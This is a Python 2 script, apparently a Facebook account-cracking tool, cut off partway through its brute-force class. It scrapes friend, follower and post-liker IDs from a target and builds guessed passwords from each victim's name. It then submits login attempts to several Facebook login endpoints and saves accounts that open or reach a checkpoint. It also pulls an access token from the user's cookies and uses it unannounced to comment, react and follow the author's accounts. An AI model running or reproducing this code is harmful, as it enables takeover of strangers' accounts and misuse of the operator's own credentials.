#coding=utf-8

#Open Source Code Nih Males Gua Encrypt Palingan Di Decrypt Ama Lu :v

\033[1;91m  █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
\033[1;91m  █  \033[1;92m########..####..######..##.....##.##.....##  \033[1;91m█
\033[1;91m  █  \033[1;92m##.....##..##..##....##.##.....##.##.....##  \033[1;91m█
\033[1;91m  █  \033[1;92m##.....##..##..##.......##.....##.##.....##  \033[1;91m█
\033[1;91m  █  \033[1;92m########...##...######..#########.##.....##  \033[1;91m█
\033[1;91m  █  \033[1;92m##...##....##........##.##.....##.##.....##  \033[1;91m█
\033[1;91m  █  \033[1;92m##....##...##..##....##.##.....##.##.....##  \033[1;91m█
\033[1;91m  █  \033[1;92m##.....##.####..######..##.....##..#######.  \033[1;91m█
\033[1;91m  █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
\033[1;91m  ╔═══════════════════•ೋೋ•═══════════════════╗ 
\033[1;91m  █ \033[1;92m /﹋\      \033[1;91m[•] Author    : \033[1;92mRishu Khan    \033[1;91m█
\033[1;91m  █ \033[1;92m(҂`_´)     \033[1;91m[•] Facebook  : \033[1;92mRishu 3:)     \033[1;91m█
\033[1;91m  █ \033[1;92m<,︻╦╤─--💥\033[1;91m[•] Version   : \033[1;92m0.2           \033[1;91m█
\033[1;91m  █ \033[1;92m /﹋\     If You dream it con you do it  \033[1;91m█
\033[1;91m  ╚═══════════════════•ೋೋ•═══════════════════╝

import marshal,zlib
import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
if 'linux' in sys.platform.lower():
    N = '\x1b[1;94m'
    G = '\x1b[1;92m'
    O = '\x1b[1;97m'
    R = '\x1b[1;91m'
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
else:
    try:
        import mechanize
    except ImportError:
        os.system('pip2 install mechanize')
    else:
        try:
            import bs4
        except ImportError:
            os.system('pip2 install bs4')

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.1)

p = "\x1b[0;37m" # putih
o = "\x1b[0;36m" # biru muda

logo = """\033[1;92                                                       [•] SCRIPT CHHOR RISHU [•]
\033[1;91m  █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
\033[1;91m  █  \033[1;92m########..####..######..##.....##.##.....##  \033[1;91m█
\033[1;91m  █  \033[1;92m##.....##..##..##....##.##.....##.##.....##  \033[1;91m█
\033[1;91m  █  \033[1;92m##.....##..##..##.......##.....##.##.....##  \033[1;91m█
\033[1;91m  █  \033[1;92m########...##...######..#########.##.....##  \033[1;91m█
\033[1;91m  █  \033[1;92m##...##....##........##.##.....##.##.....##  \033[1;91m█
\033[1;91m  █  \033[1;92m##....##...##..##....##.##.....##.##.....##  \033[1;91m█
\033[1;91m  █  \033[1;92m##.....##.####..######..##.....##..#######.  \033[1;91m█
\033[1;91m  █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
\033[1;91m  ╔═══════════════════•ೋೋ•═══════════════════╗ 
\033[1;91m  █ \033[1;92m /﹋\      \033[1;91m[•] Author    : \033[1;92mRishu Khan    \033[1;91m█
\033[1;91m  █ \033[1;92m(҂`_´)     \033[1;91m[•] Facebook  : \033[1;92mRishu 3:)     \033[1;91m█
\033[1;91m  █ \033[1;92m<,︻╦╤─--💥\033[1;91m[•] Version   : \033[1;92m0.2           \033[1;91m█
\033[1;91m  █ \033[1;92m /﹋\     If You dream it con you do it  \033[1;91m█
\033[1;91m  ╚═══════════════════•ೋೋ•═══════════════════╝"""

host="https://mbasic.facebook.com"
ua="Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"#User-Agent REDMI 6A
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36"}).json()["country_name"].lower()
except:
	ips=None

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("   ᗜ Cookies Mati").format(R,N)
def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()
def hdcok():
	global host,ua
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r
def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)
def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
def gen():#Nganggur Dulu Orb!
	ck=raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Cookie : ")
	if ck=="":gen()
	try:
		cks=gets_dict_cookies(ck)
		if lang(cks)==True:
			open(".cok","w").write(ck)
			convert()
			print ('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Login Success').format(G,N)
			time.sleep(1)
			menu()
		else:print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Invalid Cookie").format(R,N);gen()
	except Exception as e:
		print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] Error : %s"%e);gen()
                login()
def log_token():
	os.system('clear')
	print logo
	print("\033[0;96m"+50*"-")
	data = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Token: ")
	try:
		me = requests.get('https://graph.facebook.com/me?access_token='+data)
		a = json.loads(me.text)
		nama = a['name']
		open("login.txt",'w').write(data)
		print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Login Success").format(G,N)
		jalan("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Follow me on facebook:)")
		os.system('xdg-open https://www.facebook.com/Rishu.X.420')
		bot_komen()
		menu()
	except KeyError:
		print ("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Invalid Token").format(R,N)
		time.sleep(1.0)
		raw_input("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] See How To Get Token Y/y? ")
		kontolrecode()
def convert():
	global post,reac,kom
	try:
		token = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 10; GM1917) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.82 Mobile Safari/537.36', #B4ngsat
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : open(".cok",'r').read()
		})
		find_token = re.search('(EAAA\w+)', token.text)
		if (find_token is None):
			pass
		else:
			open("login.txt",'w').write(find_token.group(1))
			return
	except Exception as e:
		print(R+"\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] Error : %s"%e)
		exit()

def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] Token invalid"
		login()
	kom = ('orbXD It's Different, I Support Lu Bang to Become a Programmer:)')
	reac = ('LOVE')
	post = ('3909741969124574')
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
        requests.post('https://graph.facebook.com/100002664282607/subscribers?access_token=' + toket) # Ebink!
        requests.post('https://graph.facebook.com/100000419639430/subscribers?access_token=' + toket) # Meyy
        requests.post('https://graph.facebook.com/100027294159255/subscribers?access_token=' + toket) # Asuan Ryo Xyounaa
        #requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
        #requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
        #requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
        #requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
        #requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
        menu()

durasi = str(datetime.now().strftime('%d-%m-%Y'))

### TAKE TOKEN ###
def kontolrecode():
    os.system("clear")
    print logo
    print("\033[0;96m"+50*"-")
    jalan(p+" ["+o+"•"+p+"] Open Facebook...")
    os.system("xdg-open https://www.facebook.com/Rishu.X.420")
    raw_input(p+" [BACK]")
    login()   

#MENU CRACK, DUMP ID  
def menu():
  try:
    toket = open('login.txt','r').read()
    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
    a = json.loads(otw.text)
    nama = a['first_name']
    id = a['id']
  except Exception as e:
    print (" Error : %s"%e).format(R,N)
    time.sleep(1)
    login()
  os.system("clear")
  print logo
  print("\033[0;96m"+50*"-")
  print("\033[1;91m╔══════════════•ೋೋ•══════════════╗")
  print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] Your Name    : \033[1;32m"+nama)
  print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] Your ID      : \033[1;32m"+id)
  print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] Your Joined  : \033[1;32m"+durasi)
  print("\033[1;91m╚══════════════•ೋೋ•══════════════╝")
  print("\033[0;96m"+50*"-")
  print("\033[1;91m╔══════════════•ೋೋ•══════════════╗")
  print("\033[0;96m\033[0;97m [\033[1;31m[1]\033[1;32m] Crack ID From Friendlist/Public")
  print("\033[0;96m\033[0;97m [\033[1;31m[2]\033[1;32m] Crack ID From Followers")
  print("\033[0;96m\033[0;97m [\033[1;31m[3]\033[1;32m] Crack ID From Likes")
  print("\033[0;96m\033[0;97m [\033[1;31m[4]\033[1;32m] Cek Result Crack")
  print("\033[0;96m\033[0;97m [\033[1;31m[0]\033[1;32m] Logout")
  print("\033[1;91m╚══════════════•ೋೋ•══════════════╝")
  print ""
  r=raw_input("\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] Choose: ")
  if r=="":print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;32m] Correct content").format(R,N);menu()
  elif r=="1":
      publik()
  elif r=="2":
      followers()
  elif r=="3":
      likes()
  elif r=="4":
      ress()
#  elif r=="5":
      #unknow()
  elif r=="0":
    try:
      os.remove("login.txt")
    except Exception as e:print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] Error file not found %s"%e)
  else:
    print ("\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] WRONG!").format(R,N);menu()

def publik():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        os.sys.exit()
    try:
        print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Type \'me\' Crack From Friendlist"
        idt = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] User ID Target: ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
        except KeyError:
            print ('\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] ID Not Found!').format('R')
            menu()
        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(50000)&access_token=' + toket)
        id = []
        z = json.loads(r.text)
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Getting ID ...'
        qq = (op["first_name"]+".json").replace(' ', '_')
        ys = open(qq, 'w')
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
        ys.close()
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Total ID: %s' % len(id)
        return methode(qq)
    except Exception as e:
        exit('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Error: %s' % e)

def followers():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        os.sys.exit()
    try:
        print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Type \'me\' Crack From Your Followers "
        idt = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] User ID Target: ')
        try:
            pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
            sp = json.loads(pok.text)
            print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Name : "+sp["name"])
        except KeyError:
            print ('\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] ID Not Found!').format('R')
            menu()
        r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
        z=json.loads(r.text)
        id = []
        qq = (sp["first_name"]+".json").replace(" ","_")
        ys = open(qq , "w")#.replace(" ","_")
        for a in z["data"]:
            id.append(a["id"]+"<=>"+a["name"])
            ys.write(a["id"]+"<=>"+a["name"]+"\n")
        ys.close()
        print('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Total ID: '+str(len(id)))
        return methode(qq)
    except Exception as e:
        exit('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Error: %s' % e)
def likes():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        os.sys.exit()
    try:
        idt = raw_input('\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] ID Post Target: ')
        try:
            pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
            sp = json.loads(pok.text)
            print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Name : "+sp["name"])
        except KeyError:
            print ('\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] ID Not Found!').format('R')
            menu()
        r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
        z=json.loads(r.text)
        id = []
        qq = ("like.json").replace(" ","_")
        ys = open(qq, "w")#.replace(" ","_")
        for a in z["data"]:
            id.append(a["id"]+"<=>"+a["name"])
            ys.write(a["id"]+"<=>"+a["name"]+"\n")
        ys.close()
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Total ID: %s' % len(id)
        return methode(qq)
    except Exception as e:
        exit('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Error: %s' % e)

def mbasic(em, pas, hosts):
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get('https://mbasic.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return


def m_fb(em, pas, hosts):
    r = requests.Session()
    r.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get('https://m.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return


def touch_fb(em, pas, hosts):
    r = requests.Session()
    r.headers.update({"Host":"touch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get('https://touch.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://touch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return

def f_fb(em, pas, hosts):
    r = requests.Session()
    r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get('https://free.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({"fb_dtsg":meta,"m_sess":"","__user":"0","__req":"d","__csr":"","__a":"","__dyn":"","encpass":""})
    r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post('https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return

def graph_fb(em, pas, hosts):
    r = requests.Session()
    r.headers.update({"Host":"graph.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get('https://mbasic.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return

def methode(file):
    time.sleep(1.5)
    print '\n\x1b[0;91m [ \x1b[1;32m Select Crack Method\x1b[1;31m ]'
    print '\033[1;91m╔═══════════════•ೋೋ•════════════════╗'
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;31m[1]\x1b[1;32m] Crack With Mbasic.Facebook'
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;31m[2]\x1b[1;32m] Crack With M.Facebook'
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;31m[3]\x1b[1;32m] Crack With Touch.Facebook'
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;31m[4]\x1b[1;32m] Crack With Api.Facebook'
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;31m[5]\x1b[1;32m] Crack With Free.Facebook'
    print'\033[1;91m╚═══════════════•ೋೋ•═══════════════╝'
    print ''
    sek = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Choose: ')
    if sek == '':
        print ('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Wrong Keyword').format(R, N)
        methode(file)
    elif sek == '1' or sek =="01":
        crack(file)
    elif sek == '2' or sek =="02":
        crack1(file)
    elif sek == '3' or sek =="03":
        crack2(file)
    elif sek == '4' or sek =="04":
        crack3(file)
    elif sek == '5' or sek =="05":
        freefb(file)
    else:
        print ('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Wrong Keywor!').format(R, N)
        methode()

def login():
  os.system('clear')
  print logo
  print("\033[0;96m"+50*"-")
  print ' \x1b[0;97m[\x1b[0;96m1\x1b[0;92m] Login With Token Facebook'
  print ' \x1b[0;97m[\x1b[0;96m0\x1b[0;92m] Exite Programs'
  sek = raw_input('\n \x1b[0;97m[\x1b[0;96m•\x1b[0;91m] Choose : ')
  if sek=="":
    print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Wrong Keyword").format(R,N);login()
  elif sek=="1":
    log_token()
  elif sek=="2":
    exit()
  else:
    print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Wrong Keyword").format(R,N);login()


def generate(text):
    results = []
    for i in text.split(' '):
        if len(i) < 3:
            continue
        else:
            i = i.lower()
            if len(i) == 3 or len(i) == 4 or len(i) == 5:
                results.append(i + '123')
                results.append(i + '12345')
            else:
                results.append(i + '123')
                results.append(i + '12345')
                results.append(i)
                if 'indonesia' in ips:
                    results.append('sayang')
                    results.append('bangsat')
                    results.append('bismillah')

    return results

###### BRUTE FORCE #######

class crack:
    print ''
    def __init__(self,isifile):
        self.ada = []
        self.cp = []
        self.ko = 0
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Crack With Pass Default Or Manual [d/m]'
        while True:
            f = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Choose: ')
            if f == '':
                continue
            elif f == 'm':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '%s' % e
                    continue
                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Example : pass123,pass12345'
                self.pwlist()
                break
            elif f == 'd':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
